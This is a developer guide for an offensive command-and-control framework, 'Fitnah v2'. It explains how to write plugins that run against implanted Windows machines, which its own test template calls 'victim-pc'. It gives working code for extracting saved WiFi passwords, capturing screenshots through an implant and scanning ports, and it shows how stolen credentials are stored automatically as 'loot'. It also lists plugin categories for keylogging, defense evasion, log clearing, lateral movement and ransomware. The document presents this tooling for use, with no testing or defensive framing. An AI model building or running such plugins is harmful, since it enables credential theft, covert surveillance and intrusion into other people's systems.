# Fitnah v2 — Plugin Development Guide

This guide covers creating custom plugins for the Fitnah v2 C2 framework.

## Plugin Architecture

### BasePlugin Class

All plugins inherit from `BasePlugin`:

```python
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult, Status
from fitnah.sdk.context import PluginContext

class MyPlugin(BasePlugin):
    NAME = "my_plugin"                    # unique identifier
    CATEGORY = "execution"                # recon, credentials, execution, persistence, etc.
    DESCRIPTION = "My custom plugin"      # short desc
    AUTHOR = "@myname"
    VERSION = "1.0"
    MITRE = "T1234"                       # MITRE ATT&CK technique (optional)
    
    def run(self, session, params: dict, ctx: PluginContext) -> ModuleResult:
        """Main plugin logic — called by kernel."""
        try:
            result = ctx.ps(["some", "powershell", "command"])
            if result.returncode == 0:
                return ModuleResult.ok(result.stdout)
            else:
                return ModuleResult.err(f"Command failed: {result.stderr}")
        except Exception as exc:
            return ModuleResult.err(f"Plugin error: {exc}")
```

### Directory Structure

Plugins live in `fitnah/plugins/<category>/`:

```
fitnah/plugins/
├── recon/
│   ├── sysinfo.py
│   ├── screenshot.py
│   ├── port_scan.py
│   └── __init__.py
├── credentials/
│   ├── dump_sam.py
│   ├── browser_creds.py
│   └── __init__.py
├── execution/
│   ├── keylogger.py
│   └── __init__.py
└── persistence/
    ├── registry_run.py
    └── __init__.py
```

---

## Parameter Schema

### Defining Parameters

Plugins accept typed parameters:

```python
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.param import Param

class PortScanPlugin(BasePlugin):
    NAME = "port_scan"
    
    # Define parameters expected from operator
    PARAMS = [
        Param(
            name="target",
            type="str",
            required=True,
            help="IP address or hostname to scan"
        ),
        Param(
            name="ports",
            type="str",
            required=False,
            default="22,80,443,3389",
            help="Ports to scan (comma-separated or range: 1-1000)"
        ),
        Param(
            name="timeout",
            type="int",
            required=False,
            default=5,
            help="Connection timeout in seconds"
        ),
    ]
    
    def run(self, session, params: dict, ctx: PluginContext) -> ModuleResult:
        target = params["target"]
        ports = params.get("ports", "22,80,443,3389")
        timeout = params.get("timeout", 5)
        
        # ... plugin logic
```

### Parameter Types

```python
Param(name="ip",        type="str")      # string
Param(name="count",     type="int")      # integer
Param(name="enabled",   type="bool")     # boolean
Param(name="interval",  type="float")    # float
Param(name="choices",   type="list")     # list of strings
```

### Validation

Override `validate()` to enforce custom rules:

```python
def validate(self, raw_params: dict) -> dict:
    """Validate and normalize parameters."""
    params = super().validate(raw_params)
    
    # Custom validation
    target = params.get("target", "")
    if not target:
        raise ValueError("target is required")
    
    if "ports" in params:
        ports_str = params["ports"]
        # Validate port format (1-65535)
        try:
            self._parse_ports(ports_str)
        except ValueError as e:
            raise ValueError(f"Invalid ports: {e}")
    
    return params
```

---

## Command Execution

### Execute PowerShell Command

```python
def run(self, session, params: dict, ctx: PluginContext) -> ModuleResult:
    # Execute PowerShell command (synchronous)
    result = ctx.ps([
        "Get-Process",
        "|",
        "Select-Object Name,Handles,WorkingSet"
    ])
    
    # result = CompletedProcess(returncode, stdout, stderr)
    if result.returncode == 0:
        return ModuleResult.ok(result.stdout)
    else:
        return ModuleResult.err(result.stderr)
```

### Execute Shell Command

```python
def run(self, session, params: dict, ctx: PluginContext) -> ModuleResult:
    # Execute cmd.exe or shell command
    result = ctx.exec([
        "cmd.exe",
        "/c",
        "ipconfig /all"
    ])
    return ModuleResult.ok(result.stdout) if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### Send Raw Command to C2

```python
def run(self, session, params: dict, ctx: PluginContext) -> ModuleResult:
    # Dispatch to implant via C2 (for non-shell commands)
    result = ctx.send(
        agent_id=session.agent_id,
        command="screenshot",
        args={}
    )
    # result = {"status": "ok", "output": "base64-png-data", ...}
    return ModuleResult.ok(result.get("output", ""))
```

---

## Error Handling

### ModuleResult API

```python
from fitnah.sdk.result import ModuleResult, Status

# Success with data
return ModuleResult.ok("Result data here")

# Error with message
return ModuleResult.err("Something went wrong")

# Info status
return ModuleResult.info("Informational message")

# Timeout
return ModuleResult.timeout("Command took too long")

# With metadata (auto-saves to loot)
return ModuleResult.ok(
    data=credential_dict,
    metadata={
        "loot_kind": "credential",
        "loot_label": f"Creds from {session.hostname}",
    }
)

# Custom status
from fitnah.sdk.result import Status
mr = ModuleResult()
mr.status = Status.UNKNOWN
mr.data = "Custom result"
return mr
```

---

## Loot Saving

### Auto-Save Credentials

Plugins can mark results as "loot" for automatic database storage:

```python
def run(self, session, params: dict, ctx: PluginContext) -> ModuleResult:
    creds = [
        {"username": "admin", "password": "Pa$$w0rd!", "source": "Chrome"},
        {"username": "user2", "password": "secret", "source": "Firefox"},
    ]
    
    return ModuleResult.ok(
        data=creds,
        metadata={
            "loot_kind": "credential",
            "loot_label": f"Browser credentials from {session.hostname}",
        }
    )
```

When kernel returns this result, it automatically:
1. Saves JSON to `data/loot/loot.db`
2. Tags with loot ID (e.g., `#1234`)
3. Records in audit log

### Loot Kinds

```python
"credential"  # usernames, passwords, tokens, etc.
"file"        # exfiltrated files, source code, configs
"screenshot"  # screen captures
"generic"     # other sensitive data
```

---

## Real-World Examples

### Example 1: Screenshot Plugin

```python
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult
import base64

class ScreenshotPlugin(BasePlugin):
    NAME = "screenshot"
    CATEGORY = "recon"
    DESCRIPTION = "Capture full screen"
    AUTHOR = "@operator"
    VERSION = "1.0"
    MITRE = "T1113"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        try:
            # Send screenshot command to implant
            result = ctx.send(
                agent_id=session.agent_id,
                command="screenshot",
                args={}
            )
            
            if result.get("status") != "ok":
                return ModuleResult.err(f"Capture failed: {result.get('output')}")
            
            # Decode base64 from implant
            b64_data = result.get("output", "")
            img_bytes = base64.b64decode(b64_data)
            
            if not img_bytes:
                return ModuleResult.err("Empty image data")
            
            return ModuleResult.ok(
                data=img_bytes,  # binary PNG data
                metadata={
                    "loot_kind": "screenshot",
                    "loot_label": f"screenshot_{session.hostname}",
                }
            )
        except Exception as exc:
            return ModuleResult.err(f"Screenshot failed: {exc}")
```

### Example 2: Port Scan Plugin

```python
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.param import Param
import socket

class PortScanPlugin(BasePlugin):
    NAME = "port_scan"
    CATEGORY = "recon"
    DESCRIPTION = "Scan ports on target"
    AUTHOR = "@operator"
    VERSION = "1.0"
    MITRE = "T1046"
    
    PARAMS = [
        Param("target", "str", required=True, help="IP or hostname"),
        Param("ports", "str", required=False, default="22,80,443,3389,5985"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        target = params["target"]
        ports = self._parse_ports(params.get("ports"))
        
        open_ports = []
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((target, port))
                s.close()
                
                if result == 0:
                    service = socket.getservbyport(port)
                    open_ports.append({"port": port, "service": service})
            except Exception:
                pass
        
        if not open_ports:
            return ModuleResult.info(f"No open ports found on {target}")
        
        data = [
            f"{p['port']:<6} {p['service']}" for p in open_ports
        ]
        return ModuleResult.ok("\n".join(data))
    
    @staticmethod
    def _parse_ports(ports_str: str) -> list[int]:
        result = []
        for part in ports_str.split(","):
            if "-" in part:
                lo, hi = part.split("-", 1)
                result.extend(range(int(lo), int(hi) + 1))
            else:
                result.append(int(part))
        return sorted(set(result))
```

### Example 3: WiFi Credentials Plugin (Windows)

```python
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult
import json

class WiFiCredsPlugin(BasePlugin):
    NAME = "wifi_creds"
    CATEGORY = "credentials"
    DESCRIPTION = "Extract WiFi credentials from Windows"
    AUTHOR = "@operator"
    VERSION = "1.0"
    MITRE = "T1555"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        if "Windows" not in session.os:
            return ModuleResult.err("Windows-only plugin")
        
        # Use PowerShell to get WiFi profiles
        ps_code = """
        $profiles = netsh wlan show profiles | Select-String 'SSID' | %{$_.ToString().Split(':')[1].Trim()}
        
        $creds = @()
        foreach ($ssid in $profiles) {
            try {
                $profile = netsh wlan show profile name="$ssid" key=clear 2>$null
                $password = $profile | Select-String 'Key Content' | %{$_.ToString().Split(':')[1].Trim()}
                $creds += @{SSID=$ssid; Password=$password}
            } catch {}
        }
        
        $creds | ConvertTo-Json
        """
        
        result = ctx.ps(ps_code.split('\n'))
        if result.returncode != 0:
            return ModuleResult.err(result.stderr)
        
        try:
            creds = json.loads(result.stdout)
            return ModuleResult.ok(
                data=creds,
                metadata={
                    "loot_kind": "credential",
                    "loot_label": f"WiFi creds from {session.hostname}",
                }
            )
        except json.JSONDecodeError:
            return ModuleResult.err(f"Failed to parse: {result.stdout[:100]}")
```

---

## MITRE ATT&CK Mapping

Tag plugins with relevant MITRE techniques:

```python
MITRE = "T1082"      # System Information Discovery
MITRE = "T1046"      # Network Service Scanning
MITRE = "T1555"      # Credentials from Password Stores
MITRE = "T1113"      # Screen Capture
MITRE = "T1087"      # Account Discovery
MITRE = "T1518"      # Software Discovery
```

---

## Plugin Categories

Standard categories (lowercase):

| Category | Purpose |
|----------|---------|
| `recon` | System enumeration, discovery |
| `execution` | Code execution, command shells |
| `persistence` | Registry, scheduled tasks, WMI subscriptions |
| `privilege_escalation` | UAC bypass, kernel exploits |
| `defense_evasion` | AMSI, ETW, log clearing |
| `credentials` | Credential dumping |
| `collection` | Keylogging, clipboard, file search |
| `exfiltration` | Data staging, compression, upload |
| `lateral_movement` | PsExec, WMI, RDP |
| `impact` | Shutdown, encryption (ransomware) |

---

## Testing Plugins Locally

### Unit Test Template

```python
# test_my_plugin.py
import unittest
from unittest.mock import Mock, MagicMock
from fitnah.plugins.execution.my_plugin import MyPlugin
from fitnah.sdk.result import Status

class TestMyPlugin(unittest.TestCase):
    def setUp(self):
        self.plugin = MyPlugin()
        
        # Mock session
        self.session = Mock()
        self.session.agent_id = "abc12345"
        self.session.hostname = "victim-pc"
        self.session.os = "Windows 10"
        
        # Mock context
        self.ctx = Mock()
        self.ctx.ps = MagicMock(return_value=Mock(returncode=0, stdout="output", stderr=""))
        
    def test_run_success(self):
        result = self.plugin.run(self.session, {}, self.ctx)
        self.assertEqual(result.status, Status.OK)
        self.assertIn("output", result.data)
    
    def test_run_error(self):
        self.ctx.ps.return_value = Mock(returncode=1, stdout="", stderr="failed")
        result = self.plugin.run(self.session, {}, self.ctx)
        self.assertEqual(result.status, Status.ERROR)

if __name__ == "__main__":
    unittest.main()
```

### Run Tests

```bash
python -m pytest fitnah/tests/ -v
```

---

## Hot-Reload (Development)

Reload plugins without restarting C2:

```
fitnah> reload --plugins
[*] Reloading plugins...
[✓] 42 plugins loaded
[*] New plugins: my_new_plugin
[*] Updated: sysinfo (1.0 → 1.1)
```

The kernel automatically detects and reloads from `fitnah/plugins/`.

---

## Installation & Distribution

### Install Custom Plugin

```bash
# From local file
fitnah> plugin --install /path/to/my_plugin.py

# From URL
fitnah> plugin --install https://example.com/plugins/my_plugin.py

# From GitHub raw
fitnah> plugin --install https://raw.githubusercontent.com/user/repo/main/plugin.py
```

### Uninstall Plugin

```
fitnah> plugin --uninstall my_plugin
[*] Removed my_plugin
```

### Share Plugin Template

```python
"""
My Custom Plugin — Brief description

Author: @yourname
Version: 1.0
License: MIT

Usage:
  fitnah> use my_plugin agent_id --param value
"""

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.param import Param

class MyPlugin(BasePlugin):
    NAME = "my_plugin"
    CATEGORY = "execution"
    DESCRIPTION = "Does something cool"
    AUTHOR = "@yourname"
    VERSION = "1.0"
    MITRE = "T1234"
    
    PARAMS = []  # define if needed
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        # TODO: implement
        return ModuleResult.ok("Not implemented yet")
```

---

## Advanced: Custom Types & Validators

### Enum Parameter

```python
class MyPlugin(BasePlugin):
    PARAMS = [
        Param(
            name="level",
            type="str",
            required=False,
            default="medium",
            help="Verbosity level (low, medium, high)",
            validator=lambda x: x in ["low", "medium", "high"]
        ),
    ]
```

### List/Array Parameter

```python
PARAMS = [
    Param(
        name="targets",
        type="list",
        required=True,
        help="List of IP addresses",
        validator=lambda lst: all(is_valid_ip(ip) for ip in lst)
    ),
]
```

---

## Debugging

### Enable Debug Logging

```python
import logging
log = logging.getLogger(__name__)

class MyPlugin(BasePlugin):
    def run(self, session, params: dict, ctx) -> ModuleResult:
        log.debug(f"Running on {session.hostname} with params {params}")
        # ... logic ...
        log.error("Something failed")
        return ModuleResult.err("Error occurred")
```

Check logs:

```bash
tail -f logs/fitnah.log | grep -i my_plugin
```

---

## Next Steps

- **SDK Reference**: See `fitnah/sdk/` for BasePlugin, ModuleResult, PluginContext
- **Example Plugins**: Browse `fitnah/plugins/` for real implementations
- **Usage**: See `README_USAGE.md` for CLI plugin commands
